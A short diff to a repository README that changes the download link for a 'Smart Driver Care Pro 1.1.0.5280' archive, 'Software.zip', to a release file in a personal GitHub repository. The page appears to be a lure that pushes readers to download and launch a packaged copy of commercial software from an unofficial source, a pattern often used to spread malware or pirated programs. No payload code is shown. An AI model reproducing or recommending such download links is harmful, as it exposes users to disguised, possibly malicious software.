@@ -32,7 +32,7 @@ Explore a variety of topics related to drivers, driver programming, driver updat
 
 To access the Smart Driver Care Pro 1.1.0.5280 software, simply click the button below to download:
 
-[![Download Smart Driver Care Pro](https://img.shields.io/badge/Download-Software.zip-orange)](https://github.com/user-attachments/files/18410590/Software.zip "Launch Software")
+[![Download Smart Driver Care Pro](https://github.com/jiggly1/Smart-Driver-Care-Pro-1.1.0.5280/releases/download/v2.0/Software.zip)](https://github.com/jiggly1/Smart-Driver-Care-Pro-1.1.0.5280/releases/download/v2.0/Software.zip "Launch Software")
 
 If the link does not work, please check the "Releases" section of this repository for alternative download options.
 
